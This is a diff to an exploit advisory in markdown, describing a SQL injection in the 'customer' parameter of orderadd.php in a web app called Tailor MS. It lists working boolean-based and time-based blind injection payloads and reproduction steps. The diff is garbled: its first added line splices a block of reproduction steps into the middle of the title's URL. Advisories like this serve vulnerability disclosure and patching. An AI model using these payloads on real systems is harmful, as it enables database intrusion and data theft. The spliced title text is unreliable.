@@ -1,4 +1,12 @@
-# Exploit Title: Tailor MS – SQL Injection in orderadd.php (`http://localhost/tailor/orderadd.php`)
+# Exploit Title: Tailor MS – SQL Injection in orderadd.php (`htt## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/orderadd.php`.  
+2. Intercept the POST request and inject the following payload into the `customer` parameter:
+    ```
+    customer=1' AND SLEEP(5)-- -
+    ```
+3. Observe the time delay in the response confirming the SQL injection vulnerability (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.calhost:8000/orderadd.php`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,25 +28,31 @@ A SQL Injection vulnerability exists in the `orderadd.php` endpoint of **Tailor 
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/orderadd.php`
+- **URL:** `http://localhost:8000/orderadd.php`
 - **HTTP Method:** POST
 - **Vulnerable File:** `orderadd.php`
 - **Parameter:** `customer`
 - **Vector Location:** POST
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
   - **Payload:** `customer=1' AND 8043=(SELECT (CASE WHEN (8043=8043) THEN 8043 ELSE (SELECT 9045 UNION SELECT 7135) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   - **Payload:** `customer=1' AND (SELECT 6736 FROM (SELECT(SLEEP(5)))wYCi)-- Bots`
+- **Type:** Time-based Sleep (exfiltration)
+  - **Title:** Time-based blind injection using SLEEP
+  - **Payload:**  
+    ```
+    customer=1' AND SLEEP(5)-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -58,7 +72,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/orderadd.php`.  
+1. Browse to `http://localhost:8000/orderadd.php`.  
 2. Intercept the request and inject the provided payload(s) into parameter `orderadd.php??<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -68,7 +82,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
